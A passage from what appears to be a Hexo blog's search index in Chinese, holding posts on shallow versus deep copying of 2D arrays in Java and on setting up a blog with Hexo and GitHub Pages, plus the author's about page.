class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">public class cloneTeset &#123;<br>    public static void main(String[] args) &#123;<br>        int a[][] &#x3D; &#123;&#123;0,0,0&#125;,&#123;1,1,1&#125;,&#123;2,2,2&#125;&#125;;<br>        int b[][] &#x3D; a.clone();<br>        b[1][1]&#x3D;3;<br>        for(int i&#x3D;0;i&lt;3;i++)&#123;<br>            for(int j&#x3D;0;j&lt;3;j++)&#123;<br>                System.out.print(a[i][j]+&quot; &quot;);<br>            &#125;<br>            System.out.print(&quot; &quot;);<br>        &#125;<br>        System.out.println();<br>        for(int i&#x3D;0;i&lt;3;i++)&#123;<br>            for(int j&#x3D;0;j&lt;3;j++)&#123;<br>                System.out.print(b[i][j]+&quot; &quot;);<br>            &#125;<br>            System.out.print(&quot; &quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果是</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">0 0 0  1 3 1  2 2 2  <br>0 0 0  1 3 1  2 2 2<br></code></pre></td></tr></table></figure><p>可以发现,对a的拷贝b进行修改后，原数组a的值也被修改了。这是为什么呢？</p><p>首先我们知道，虽然数组的声明方式与其他对象有所不同，但它也是new出来的。在Java中，数组是一个对象。</p><p>查看官方文档，在Object的Clone()方法的描述中有这么两段话:</p><blockquote><p>By convention, the object returned by this method should be independent of this object (which is being cloned). To achieve this independence, it may be necessary to modify one or more fields of the object returned by super.clone before returning it. Typically, this means copying any mutable objects that comprise the internal “deep structure” of the object being cloned and replacing the references to these objects with references to the copies. If a class contains only primitive fields or references to immutable objects, then it is usually the case that no fields in the object returned by super.clone need to be modified.<br>一般来说，我们希望cloen()方法返回的对象相是独立于被克隆对象的，所以我们在返回clone方法前，应该对克隆出的对象的域进行一些修改。这通常意味着，复制被克隆对象所包含的所有内部深层结构的可变对象，并且将域中的引用，指向这些复制出的对象。如果一个类只包含基础类型或者指向不可变对象的引用，那么将不用修改Super.clone()的返回结果。</p></blockquote><p>注：不可变对象有哪些？<br>String对象都是不可变对象。<br>原始类型包装类（primitive wrappers）（Integer，Long, Short, Double, Float, Character, Byte, Boolean）也都是不可变的。<br>关键字final用于声明基本类型和对象引用为不可变对象，但是它不能使对象本身变为不可变对象。</p><p>我们再看下一段：</p><blockquote><p>The method clone for class Object performs a specific cloning operation. First, if the class of this object does not implement the interface Cloneable, then a CloneNotSupportedException is thrown. Note that all arrays are considered to implement the interface Cloneable and that the return type of the clone method of an array type T[] is T[] where T is any reference or primitive type. Otherwise, this method creates a new instance of the class of this object and initializes all its fields with exactly the contents of the corresponding fields of this object, as if by assignment; the contents of the fields are not themselves cloned. Thus, this method performs a “shallow copy” of this object, not a “deep copy” operation. Thus, this method performs a “shallow copy” of this object, not a “deep copy” operation.<br>clone()方法首先会判断一个对象是否实现了Cloneable接口，如果没有实现，则会抛出CloneNotSupportedException。而所有的数组都默认实现了Cloneable接口。如果对数组T[]进行克隆，返回结果是T[]，T是引用或者基本类型。如果对对象进行克隆，首先会新建一个这个类的实例，然后根据这个对象中域的内容来对新建的实例进行初始化（赋值操作）。因此clone（）这个方法实现了浅拷贝，并不是深拷贝。</p></blockquote><p>从以上两段话我们可以看出：<br>clone( )方法创建调用它的对象的一个复制副本。只有那些实现Cloneable接口的类能被复制。<br>如果对数组T[]进行克隆，返回结果是T[]，T是引用或者基本类型。<br>我们克隆的数组是二维数组，即数组的数组。对于clone()方法来说，这里的T[]，T是一个对数组的引用。<br>也就是说：我们克隆出来的数组的第一维度，和原来那个数组的第一维度。同时指向了同一个第二位度的数组。<br>如下图：</p><p>因此当改变数组b的时候，数组a也被改变。此时的引用关系图如下：</p><p><img src="/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/clone1.png" alt></p><p>所以，为了实现二维数组的克隆，我们需要分别对第二维度的每一个数组进行克隆。<br>实现如下：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">int b[][] &#x3D; new int[a.length][];<br>for(int i&#x3D;0;i&lt;a.length;i++)&#123;<br>b[i]&#x3D;a[i].clone();<br>&#125;<br></code></pre></td></tr></table></figure><p>将之前代码的复制部分改为以上实现，输出结果如下：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">0 0 0  1 1 1  2 2 2  <br>0 0 0  1 3 1  2 2 2<br></code></pre></td></tr></table></figure><p>可以看出使用这种方法，实现了深拷贝，两个数组相互独立，不会互相影响。<br>同样的，Java提供的Arrays.copyof()方法对于二维数组也是浅拷贝，也需要我们为数组中的每一项进行copy。<br>此时的引用关系如下图：<br><img src="/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/clone2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Hexo和GitHubPages搭建博客</title>
      <link href="/2018/08/15/%E7%94%A8Hexo+GitHubPages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2018/08/15/%E7%94%A8Hexo+GitHubPages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>拥有自己的网站总是一件很酷的事，早就想自己写一个博客了。因为并没有深入学习前端，之前实验课模仿饿了么的商家入驻页面，一个页面写了几天才搞得差不多。虽然写前端也很吸引人，但果真我还是更喜欢写后台。最近在一个面试群里看到有人发自己的博客。用的是wordpress，听说这样很方便，于是就去搜了搜，于是就发现了HEXO。哇塞连后台都不用写了。虽然最近又有一大堆东西要复习。反正管它呢，搭了再说！</p><a id="more"></a><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>因为要用到GithubPages，所以首先在GitHub新建一个仓库，用来存放githubPages的项目文件。 GithubPages分为两种，个人页面和项目页面，个人页面每个用户只有一个,仓库名格式一定要为XXX.github.io。</p><p>下载安装node.js（安装hexo会用到）。node.js会自动将安装路径添加到环境变量。路径下有npm的命令行文件。<br>npm是包管理工具。可以从NPM服务器下载别人编写的第三方包，或者命令行。也可以上传自己编写的供别人使用。</p><p>将npm镜像更换为淘宝镜像，因为从国内访问原版镜像很慢。命令行执行：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>安装后就可以使用淘宝定制的 cnpm (gzip 压缩支持) 命令行工具代替默认的 npm</p><h3 id="安装并部署hexo"><a href="#安装并部署hexo" class="headerlink" title="安装并部署hexo"></a>安装并部署hexo</h3><p>创建一个文件夹，名为Myblog，在该文件夹路径下按shift+鼠标右键打开powershell，使用cnpm安装Hexo：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>安装完成后，初始化博客，其中blog是项目名称（可以修改为你想要的名称）：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo init blog<br></code></pre></td></tr></table></figure><p>新建一篇文章（markdown格式）</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd blog<br>hexo new &quot;My First Blog&quot;<br></code></pre></td></tr></table></figure><p>会在/blog/sources/_post/目录下生成My-First-Blog.md文件。</p><p>使用Hexo引擎将md文档格式渲染为html文件，并放入博客项目之中（blog/public/年/月/日/文章名 目录下）。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo generate<br></code></pre></td></tr></table></figure><p>修改项目部署配置文件</p><p>打开项目配置文件_config.yml，最后一行是部署配置，我们打开注释中的文档网址可以看到相关配置的含义。根据文档提示修改配置文件。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">deploy:<br>    type: git<br>    repo: https:&#x2F;&#x2F;github.com&#x2F;XXXXX&#x2F;XXXXX.github.io.git   #之前创建的那个仓库的完整路径<br></code></pre></td></tr></table></figure><p>保存关闭。</p><p>安装git部署插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>部署</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo clean<br>hexo g      #hexo generate的缩写<br>hexo d      #hexo deploy的缩写<br></code></pre></td></tr></table></figure><p>部署成功后就可以访问啦！<br>路径是XXX.github.io</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>首先在你的本地项目路径/source文件夹下创建一个文件名为CNAME，在其中写入你的域名。如</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">alphabet.com<br></code></pre></td></tr></table></figure><p>然后保存.<br>在项目路径打开Powershell</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">hexo g -d      #重新生成文件并部署<br></code></pre></td></tr></table></figure><p>在github打开该仓库的设置页面,就是如下这个页面</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">https:&#x2F;&#x2F;github.com&#x2F;xxx&#x2F;xxx.github.io&#x2F;settings<br></code></pre></td></tr></table></figure><p>找到GitHub Pages，在其中的Custom Domain中填入自己的域名。</p><p>打开cmd，ping 你的项目路径，即XXX.github.io,你会得到一个ip地址，记住这个地址。<br>然后打开你的域名管理页面，在其中添加两个解析条目</p><table><thead><tr><th align="center">主机记录</th><th align="center">记录类型</th><th align="left">记录值</th></tr></thead><tbody><tr><td align="center">@</td><td align="center">A</td><td align="left">IP地址</td></tr><tr><td align="center">www</td><td align="center">CNAME</td><td align="left">xxx.github.io</td></tr></tbody></table><p>这样就OK了，访问域名就可以访问到自己的hexo博客了。<br>可以在github选择EnforceHTTPS,这样就算是http请求，也会被转为HTTPS。根据github的提示，只需要在域名解析中添加<br>以下四个条目中至少一个就可以了</p><table><thead><tr><th align="center">主机记录</th><th align="center">记录类型</th><th align="left">记录值</th></tr></thead><tbody><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.108.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.109.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.110.153</td></tr><tr><td align="center">@</td><td align="center">A</td><td align="left">185.199.111.153</td></tr></tbody></table><p>至此，如果不出意外的话，就可以从域名访问到GithubPage了！</p><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>如果觉得默认主题不好看的话，可以<a href="https://hexo.io/themes/" target="_blank" rel="noopener">在这里</a>选择自己喜欢的主题。具体的配置根据每个主题下的ReadMe来修改就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="Pyrrhax"><a href="#Pyrrhax" class="headerlink" title="Pyrrhax"></a>Pyrrhax</h2><p><strong>Be What You Wanna Be!!!</strong></p><p><strong>GitHub:<a href="https://github.com/Pyrrhax" target="_blank" rel="noopener">@Pyrrhax</a></strong><br><strong>Email:<a href>pyrrhax.hf@gmail.com</a></strong><br><strong>我的书单：<a href="https://book.douban.com/people/184374019/">https://book.douban.com/people/184374019/</a></strong><br><strong>我的知乎：<a href="https://www.zhihu.com/people/pyrrhax" target="_blank" rel="noopener">https://www.zhihu.com/people/pyrrhax</a></strong><br><strong>我的CSDN:<a href="https://blog.csdn.net/weixin_42714910" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42714910</a></strong></p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>0.Pyrrha是动漫《RWBY》里面的Pyrrha.</p><p>1.<em>核心游戏玩家</em>。如果要说几个我喜欢的游戏的话，《半条命》系列，《古墓丽影9》，《深海迷航》，剧情类有《去月球》《奇异人生》系列，另外很期待万向跑步机普及后玩《半条命Alyx》的感觉。FPS游戏历程CF-&gt;逆站-&gt;AVA-&gt;WarFace-&gt;CS:GO-&gt;PUBG-&gt;叛乱-&gt;红色管弦乐-&gt;叛乱2。PUBG 1200+小时，最高日韩服Rank1.5%，不过很久没玩了。之前因为看了某动画，突然想玩MMORPG网游，了解了几天觉得想玩《勇者斗恶龙X》。不过竟然都X了，于是就了解了下《勇者斗恶龙》全系列。没错，于是我就买了NDSi来玩《勇者斗恶龙4》了。唔，果真日式RPG需要刷刷刷。不过在当时那个年代大家一定乐此不疲。在玩的还有《异域镇魂曲》，文本量巨大- -就当记单词了</p><p>2.<em>图吧垃圾佬</em>。沉迷捡垃圾和折腾软硬件。在知乎有个人说：“要把精力专注在业务上，而不是这种杂七杂八的问题。”可能说的就是我吧。。。笔记本改水冷，DIY充电宝，捡垃圾组装电脑和折腾和操作系统，用树莓派或安卓设备做移动渗透测试设备等等。你敢信家里十二年前的台式机现在还可以打英雄联盟。。。</p><p>3.<em>科幻爱好者</em>。《三体》《攻壳机动队》都十分喜欢，《攻壳机动队》简直是脑机接口发展的成熟阶段。要说崇拜的人大概是Musk吧。说到这些，想到一句话Any sufficiently advanced technology is indistinguishable from magic。</p><p>4.<em>比较宅</em>。每次出门后都要感叹，哇，现实世界的画质真的需要好复杂的计算，不过看起来竟没有更低一些的画质好看。</p><p>5.<em>语言学习</em>。希望成为一个fluent English Speaker.毕竟英语是我在CS之外，唯一坚持下来的算的上是爱好的东西。日语也学了一些，加油加油。</p><p>6.<em>读书</em>。会对自己感兴趣的方面阅读各种相关的书籍，也会读一些被人推荐的书。哲学读过一些入门书。心理学方面，认知神经学相关读的比较多。大概读几本科普或功能类书籍之后会读一本文学类作为切换。</p><p>7.<em>有一辆小摩托(GSX250R)</em>。穿上一身防水装备，机动性爆表，喜欢周末去城市周边跑山。文明驾驶，不是深夜炸街的鬼火少年哦。</p><p>8.怕什么真理无穷，进一寸有一寸的欢喜。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
